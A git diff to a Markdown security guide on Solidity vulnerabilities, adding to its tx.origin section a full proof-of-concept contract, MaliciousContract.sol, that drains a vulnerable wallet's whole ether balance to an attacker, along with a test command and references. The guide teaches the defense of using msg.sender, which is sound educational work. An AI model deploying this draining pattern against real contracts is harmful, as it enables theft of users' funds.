@@ -265,11 +265,52 @@ In `vulnerableTransferTo` the `_owner` is compared to `tx.origin`, but even if t
 In `safeTransferTo` the `_owner` is compared to `msg.sender`, so only the address that called the function `safeTransferTo` is compared to `_owner`.  
 The malicious contract [MaliciousContract](../contracts/tx_origin/MaliciousContract.sol) abuse the `vulnerableTransferTo` function of [TxWallet](../contracts/tx_origin/TxWallet.sol), but can't abuse the `safeTransferTo` function.
 
+_MaliciousContract.sol_:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.6.0 <0.8.0;
+import "./TxWallet.sol";
+
+contract MaliciousContract {
+  TxWallet private _wallet;
+  address payable private _attackerAccount;
+
+  constructor(address payable txWallet) public {
+    _wallet = TxWallet(txWallet);
+    _attackerAccount = msg.sender;
+  }
+
+  // It works!!
+  function stealEthersFromVulnerableFunction() public {
+    _wallet.vulnerableTransferTo(_attackerAccount, address(_wallet).balance);
+  }
+
+  // it reverts!!
+  function stealEthersFromSafeSafeFunction() public {
+    _wallet.safeTransferTo(_attackerAccount, address(_wallet).balance);
+  }
+}
+
+```
+
+If a user, the owner of `TxWallet` contract, calls `stealEthersFromVulnerableFunction` then the `MaliciousContract` can drain all the ethers stored in `TxWallet` and transfers those ethers to `_attackerAccount`.  
+If a user, the owner of `TxWallet` contract, calls `stealEthersFromSafeSafeFunction` then a `revert` is triggered on `TxWallet` side and no ethers are stolen.  
+Run the exploit demonstration with:
+
+```zsh
+npx mocha --exit test/tx_origin_test.js
+```
+
 ### Defense against Authorization bypass through `tx.origin`
 
 `tx.origin` **must not be used** for authorization. Use `msg.sender` instead.
 
 ### References
+
+[SWC-115](https://swcregistry.io/docs/SWC-115)
+[Avoid using tx.origin](https://consensys.github.io/smart-contract-best-practices/recommendations/#avoid-using-txorigin) by Consensys.
+[Solidity documentation on tx.origin pitfalls](https://docs.soliditylang.org/en/latest/security-considerations.html#tx-origin)
 
 ## Reentrancy
 
